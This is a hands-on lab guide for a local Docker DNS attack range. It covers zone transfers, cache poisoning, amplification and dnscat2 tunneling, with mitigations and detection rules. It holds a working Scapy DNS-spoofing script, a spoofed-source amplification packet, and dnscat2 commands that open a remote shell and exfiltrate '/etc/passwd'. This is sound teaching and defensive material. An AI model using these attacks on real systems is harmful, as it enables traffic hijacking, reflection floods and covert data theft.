# DNS Attacks — End to End Lab Guide

**Stack:** Docker + BIND9 + Scapy + dnscat2  
**OS:** Kali or Ubuntu 22.04  
**Time:** ~3-4 hours total  
**Scope:** Local/isolated environment only. Nothing touches real infra.

---

## Setup — Shared Infrastructure for All Labs

On host machine:

```powershell
mkdir bind
mkdir bind/zones
```

**BIND9 base config** — `/bind/named.conf`:

```
options {
    directory "/var/cache/bind";
    recursion yes;
    allow-recursion { any; };        # intentionally open for labs 1 & 3
    allow-transfer { any; };         # intentionally open for lab 2
    dnssec-validation no;
    listen-on { any; };
};

zone "lab.local" {
    type master;
    file "/etc/bind/zones/lab.local.db";
};
```

`/bind/zones/lab.local.db`:

```
$TTL 60
@   IN  SOA  ns1.lab.local. admin.lab.local. (
        2024010101 3600 900 604800 60 )

@       IN  NS   ns1.lab.local.
ns1     IN  A    10.10.0.10
www     IN  A    10.10.0.50
mail    IN  A    10.10.0.51
vpn     IN  A    10.10.0.52
dev     IN  A    10.10.0.53
admin   IN  A    10.10.0.54
db      IN  A    10.10.0.55
secret  IN  TXT  "internal-api-key=abc123"
```

---

All labs run on a single Docker network. Spin this up once, keep it running across all labs.

```yaml
# docker-compose.yml
version: "3"
services:
  ns1:                          # authoritative / recursive DNS (BIND9)
    image: ubuntu/bind9:latest
    container_name: ns1
    volumes:
      - ./bind:/etc/bind
    ports:
      - "5353:53/udp"
      - "5353:53/tcp"
    networks:
      dnslab:
        ipv4_address: 10.10.0.10

  attacker:
    image: kalilinux/kali-rolling
    container_name: attacker
    tty: true
    networks:
      dnslab:
        ipv4_address: 10.10.0.20

  victim:
    image: ubuntu:22.04
    container_name: victim
    tty: true
    networks:
      dnslab:
        ipv4_address: 10.10.0.30

networks:
  dnslab:
    driver: bridge
    ipam:
      config:
        - subnet: 10.10.0.0/24
```

```bash
docker compose up -d
docker exec -it attacker bash -c "apt update -qq && apt install -y dnsutils scapy python3 tcpdump dnscat2 nmap 2>/dev/null"
docker exec -it victim bash -c "apt update -qq && apt install -y dnsutils curl 2>/dev/null"
```

---

## Lab 1 — DNS Reconnaissance & Zone Transfer (AXFR)

**What you're doing:** Pull the entire zone file from a misconfigured authoritative server. This is recon step zero before any DNS-based attack.

**Why it matters:** A successful AXFR hands you every hostname, IP, TXT record (which sometimes contain API keys, SPF configs, internal notes) without triggering any IDS noise since it's a legitimate DNS protocol operation. Real-world example: APT28's 2024-2026 FrostArmada campaign did infrastructure mapping through DNS before pivoting to router compromise.

### Part 1 — Manual Recon

```bash
docker exec -it attacker bash

# Who are the nameservers?
dig NS lab.local @10.10.0.10

# Pull the full zone — AXFR over TCP/53
dig AXFR lab.local @10.10.0.10

# What you should see: every record in the zone file.
# Note the TXT record on "secret" — that's your intel.
```

### Part 2 — Tool-assisted Enum

```bash
# dnsrecon does AXFR + subdomain brute in one shot
apt install dnsrecon -y
dnsrecon -d lab.local -n 10.10.0.10 -t axfr

# nmap DNS scripts
nmap --script dns-zone-transfer -p 53 10.10.0.10

# Check if it's an open resolver (will resolve external domains)
dig google.com @10.10.0.10 +short
```

### Part 3 — Fix It (Understand the Mitigation)

Edit `/bind/named.conf` on ns1:

```
zone "lab.local" {
    type master;
    file "/etc/bind/zones/lab.local.db";
    allow-transfer { none; };        # lock it down
    // allow-transfer { 10.10.0.11; }; # only to secondary NS
};
```

```bash
docker exec ns1 rndc reload
# Now retry the AXFR — should get REFUSED
dig AXFR lab.local @10.10.0.10
```

**What you should observe:** `Transfer failed` / `REFUSED`. The full mitigation uses TSIG keys to authenticate transfers cryptographically — that's the production approach.

---

## Lab 2 — DNS Cache Poisoning (Local / Spoof Race)

**What you're doing:** Sniff a DNS query, forge a response before the real one arrives, get your fake record cached.

**Why it matters:** DNS was designed with no answer authentication. Resolvers accept the first matching response. In the classic Kaminsky attack (2008), you don't even need to sniff — you brute-force the 16-bit transaction ID. TTLs mean one successful poison can redirect thousands of users until the record expires.

### Part 1 — Observe Normal Resolution

```bash
# Terminal 1 — victim makes a DNS query
docker exec -it victim bash
dig www.lab.local @10.10.0.10

# Terminal 2 — watch the traffic
docker exec -it attacker tcpdump -i eth0 -nn port 53
```

Note the transaction ID (the 4-digit hex in the query line). This is what you need to forge.

### Part 2 — Spoof a DNS Response with Scapy

```bash
docker exec -it attacker bash
python3
```

```python
from scapy.all import *

# Sniff one DNS query, forge a response
def poison(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # it's a query
        qname = pkt[DNS].qd.qname.decode()
        if b"www.lab.local" in pkt[DNS].qd.qname:
            print(f"[*] Caught query for {qname}, injecting poison")
            spoofed = (
                IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                UDP(sport=53, dport=pkt[UDP].sport) /
                DNS(
                    id=pkt[DNS].id,          # match the transaction ID
                    qr=1,                    # this is a response
                    aa=1,                    # authoritative
                    qd=pkt[DNS].qd,
                    an=DNSRR(
                        rrname=qname,
                        ttl=3600,
                        rdata="10.10.0.99"  # attacker-controlled IP
                    )
                )
            )
            send(spoofed, verbose=0)
            print(f"[+] Poisoned response sent: {qname} -> 10.10.0.99")

# Run in one window — waits for queries
sniff(filter="udp port 53", prn=poison, store=0)
```

```bash
# From victim (second terminal) — trigger the query while sniffer is running
docker exec -it victim dig www.lab.local @10.10.0.10

# Check the answer section — should show 10.10.0.99 instead of 10.10.0.50
```

### Part 3 — Verify the Cache is Poisoned

```bash
# On ns1, dump the cache
docker exec ns1 rndc dumpdb -cache
docker exec ns1 cat /var/cache/bind/named_dump.db | grep www.lab.local

# If cached: you'll see your 10.10.0.99 in there
# Flush to clean up
docker exec ns1 rndc flush
```

### Part 4 — Why the Kaminsky Attack Works Without Sniffing

You don't need to be on the same network segment to poison a cache. The Kaminsky variant:

1. Attacker triggers the resolver to query a domain they influence (e.g. `rand.attacker.com`)
2. Simultaneously floods thousands of forged responses with every possible transaction ID (0–65535)
3. One will match — poisoning the cache for the *authoritative NS* of the domain, not just one record
4. Now every subdomain query for that domain resolves through the attacker's NS

The fix is source port randomization (adds ~16 bits of entropy on top of the 16-bit TX ID = ~32 bits). DNSSEC is the real fix — it cryptographically signs every record.

---

## Lab 3 — DNS Amplification (Reflection / DDoS)

**What you're doing:** Send a small DNS query with a spoofed source IP. The DNS server sends a response 10–100x larger to the victim. Scale this with botnets and you have a DDoS amplifier.

**Setup note:** True IP spoofing requires raw socket privileges and a network that doesn't do BCP38 egress filtering. In Docker we simulate it by observing the amplification factor — the core of the vulnerability.

### Part 1 — Measure Amplification Factor

```bash
docker exec -it attacker bash

# Small query (~40 bytes)
tcpdump -i eth0 -nn port 53 -c 20 &
dig lab.local @10.10.0.10 A

# Large query — ANY record type fetches everything
dig ANY lab.local @10.10.0.10 +dnssec

# With DNSSEC records the response balloons significantly
# Check the tcpdump byte counts
```

### Part 2 — Scapy Amplification PoC

```python
from scapy.all import *

# In a real attack, src= would be the victim's IP
# Here we use loopback to stay isolated
victim_ip = "10.10.0.30"
resolver_ip = "10.10.0.10"

packet = (
    IP(src=victim_ip, dst=resolver_ip) /
    UDP(dport=53) /
    DNS(rd=1, qd=DNSQR(qname="lab.local", qtype="ANY"))
)

print(f"Query size: {len(packet)} bytes")
# Don't send to external — measure locally
# send(packet, verbose=0)

# Just show the response size from a normal query
resp = sr1(IP(dst=resolver_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="lab.local", qtype="ANY")), timeout=2, verbose=0)
if resp:
    print(f"Response size: {len(resp)} bytes")
    print(f"Amplification factor: {len(resp)/len(packet):.1f}x")
```

Typical ANY query amplification: **10–70x**. With DNSSEC zones: up to **100x**.

### Part 3 — Check if You're an Open Resolver

```bash
# Test from attacker — can it resolve external domains?
dig google.com @10.10.0.10 +short

# If yes — this server can be weaponized for amplification against anyone
# Check against Shodan's open resolver database pattern:
dig @10.10.0.10 +short test.openresolver.com TXT
```

### Part 4 — Mitigations

```bash
# On ns1 — edit named.conf to restrict recursion
# Change:
#   allow-recursion { any; };
# To:
#   allow-recursion { 10.10.0.0/24; };  # only internal clients
#   recursion no;                         # or disable entirely for authoritative-only

docker exec ns1 rndc reload

# Rate limiting (RPZ/RRL) — add to named.conf options:
# rate-limit {
#     responses-per-second 5;
#     window 5;
# };
```

---

## Lab 4 — DNS Tunneling (C2 over DNS with dnscat2)

**What you're doing:** Establish an encrypted command-and-control channel entirely over DNS queries and responses. Bypasses firewalls that only block TCP/UDP but allow port 53 outbound.

**Why it matters:** DNS is almost never blocked at the perimeter. dnscat2 encodes arbitrary data into DNS TXT/CNAME/MX queries, making it a reliable C2 channel even through aggressive filtering.

### Part 1 — Set Up the C2 Server (attacker)

```bash
docker exec -it attacker bash

# Install dnscat2 server (Ruby)
apt install -y dnscat2 2>/dev/null || gem install dnscat2

# Start server — no domain needed in local mode
ruby /usr/share/dnscat2/dnscat2.rb --dns host=0.0.0.0,port=53 --security=open --no-cache
```

### Part 2 — Connect from Victim

```bash
docker exec -it victim bash
apt install -y dnscat2-client 2>/dev/null

# Connect to attacker's dnscat2 server directly
dnscat --dns host=10.10.0.20,port=53 --security=open
```

### Part 3 — Use the C2 Channel

Back in the attacker terminal, dnscat2 will show a new session:

```
dnscat2> sessions
dnscat2> session -i 1
command (victim) 1> shell
# Now you have a shell on victim, all traffic tunneled through DNS
command (victim) 1> exec cmd /c whoami   # on Windows target
sh (victim) 1> id                         # on Linux
sh (victim) 1> cat /etc/passwd | xxd | head  # exfil demo
```

### Part 4 — Capture and Analyze the Traffic

```bash
# In a third terminal — see what DNS tunneling looks like on the wire
docker exec -it attacker tcpdump -i eth0 -nn port 53 -A

# What to look for:
# - Very long subdomains (base32/hex-encoded payload)
# - High query frequency to a single domain  
# - Unusual record types (TXT, CNAME, MX being used for queries)
# - Domain length entropy significantly higher than normal traffic
```

Example of what tunneled DNS traffic looks like:

```
; encoded data in the subdomain label
7369643d313b617474656d70743d323b.dnscat2.lab.local TXT ?
```

### Part 5 — Detection Signatures

```bash
# Wireshark filter for anomalous DNS
# udp.port == 53 && dns.qry.name matches "^[a-f0-9]{20,}"

# Check average query length — normal DNS: <20 chars per label
# Tunneling: 40-60+ chars per label (base32/hex encoded)

# Snort/Suricata rule concept:
# alert udp any any -> any 53 (msg:"DNS Tunnel - long label"; 
#   content:"|00|"; pcre:"/[a-z0-9]{40,}\./i"; sid:9000001;)

# Practical detection: count unique subdomains per domain per minute
# Normal: <10. Tunneling: hundreds.
```

---

## Lab 5 — Putting It Together: AXFR → Cache Poison → C2

A realistic attack chain combining what you've done:

```
1. AXFR recon          → map the full zone, find internal hostnames/IPs
2. Identify target     → find a hostname the victim machine queries frequently
3. Cache poison        → redirect that hostname to attacker IP  
4. Victim connects     → victim browser/app hits attacker-controlled server
5. Serve payload       → attacker returns page/redirect with dnscat2 client
6. Tunnel established  → C2 over DNS, firewall sees only port 53 traffic
```

**Simulate steps 1–3 in sequence:**

```bash
# Step 1
dig AXFR lab.local @10.10.0.10 | grep -E "A|TXT"

# Step 2 — pick "www" as target

# Step 3 — run the scapy poison script from Lab 2 in background
# then trigger victim to query www.lab.local
docker exec -it victim curl http://www.lab.local  # now hits attacker IP

# Step 4-6 — run dnscat2 server on attacker, victim "downloads" client from poisoned URL
```

---

## Detection Reference

| Attack | Key Signal | Tool |
| --- | --- | --- |
| AXFR | TCP/53 from non-secondary IPs | Wireshark / BIND logs |
| Cache Poison | Response before authoritative reply arrives | IDS timing analysis |
| Amplification | High-volume ANY queries, spoofed src | BCP38 / rate-limit |
| Tunneling | Long subdomain labels, high entropy, TXT query volume | Zeek / Suricata |

---

## Cleanup

```bash
docker compose down -v
rm -rf ./bind/zones/named_dump.db
```

---

## What's Not Covered (Next Steps)

- **BGP hijacking + DNS**: route hijacking to MitM authoritative responses at scale
- **NXDOMAIN attacks**: flood resolvers with non-existent domains to exhaust cache
- **DNS rebinding**: bypass SOP in browsers — good rabbit hole
- **DoH tunneling**: same as Lab 4 but over HTTPS/443, much harder to detect
- **DNSSEC rollout**: actually sign a zone with `dnssec-keygen` + `named-checkzone`